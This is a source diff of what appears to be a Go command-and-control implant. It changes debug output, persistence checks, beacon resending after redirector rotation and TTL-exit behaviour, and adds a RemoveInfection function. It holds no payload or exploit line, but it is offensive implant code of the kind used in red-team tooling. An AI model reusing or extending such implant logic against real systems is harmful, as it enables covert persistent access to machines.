@@ -15,7 +15,7 @@ import (
 	"os"
 	"strings"
 	//Debug
-	//"fmt"
+	"fmt"
 	"sync"
 )
 
@@ -71,6 +71,7 @@ var(
 	jobsToProcess *JobsToProcess	
 
 	sysinfo bool
+	persisted bool
 
 	ttlC *time.Timer
 )
@@ -97,11 +98,16 @@ func main() {
 	jobsToProcess = &JobsToProcess{Jobs:jobs}
 
 
-	//TO-DO: Persistence
-	errorP,resultP := persistence.Persistence()
-	if errorP{
-		addLog("Persistence not possible:"+resultP)
+	//TO-DO: Persistence/Test
+	//Change for check persistence and battery command if none?
+
+	if (biconfig.Persistence != "NoPersistence"){
+		persisted = false
+	
+	}else{
+		persisted = true
 	}
+
 
 	sysinfo = false
 	//Prepare Network Module: Decode Json data and redirectors to set them on memory
@@ -146,6 +152,9 @@ func main() {
 					redirectors = redirectors[1:]
 					redirectors = append(redirectors,usedSave)
 					swapCount = 0
+
+					//Reset "Received" to keep sending beacons till Hive acknowledge the change of redirector
+					received = false
 				}
 
 				contChannel <- "True"
@@ -158,7 +167,7 @@ func main() {
 
 				//Debug: Continue debug
 				//fmt.Println("next round")
-				//fmt.Println(result)				
+				fmt.Println(result)				
 				
 			case <- ttlC.C:
 
@@ -166,7 +175,15 @@ func main() {
 				//fmt.Println("ttl")
 				//fmt.Println(result)
 				//TO-DO:RemoveInfection()
-				os.Exit(1)
+				//os.Exit(1)
 		}
 	}
+}
+
+
+func RemoveInfection() (bool,string){
+
+	err,res := persistence.RemovePersistence(biconfig.Persistence)
+
+	return err,res
 }
